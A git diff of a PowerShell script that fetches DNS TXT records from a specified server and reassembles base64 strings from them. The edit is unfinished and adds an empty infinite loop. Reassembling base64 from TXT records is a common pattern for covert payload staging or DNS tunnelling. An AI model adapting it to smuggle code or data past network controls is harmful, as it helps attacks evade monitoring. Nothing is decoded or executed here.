@@ -9,10 +9,27 @@ param (
 $dns_result = Resolve-DnsName -Name $host_name -Type TXT -Server $dns_server | Select-Object Strings
 $base64_output = ''
 $deconstructed_query = ''
-
-# reconstruct the output
+# the element that contains the = sign
+$final_element = ''
+# all other elements
+$remaining_elements = @()
+# iterate over all elements to find the element containing the final base64 string (denoted by the =)
+# all other parts
 for ($i=0; $i -lt $dns_result.Strings.length; $i++) {
-    $base64_output += $dns_result.Strings[$i]
+    if ($dns_result.Strings[$i] -match '=') {
+        $final_element = $dns_result.Strings[$i]
+    } else {
+        $remaining_elements += $dns_result.Strings[$i]
+    }
+}
+
+Write-Output "final element $final_element"
+Write-Output "reamining elements $remaining_elements"
+
+while (1 -eq 1) {
+    for ($i = 1; $i -lt $remaining_elements.length; $i++) {
+
+    }
 }
 
 # uncomment to debug
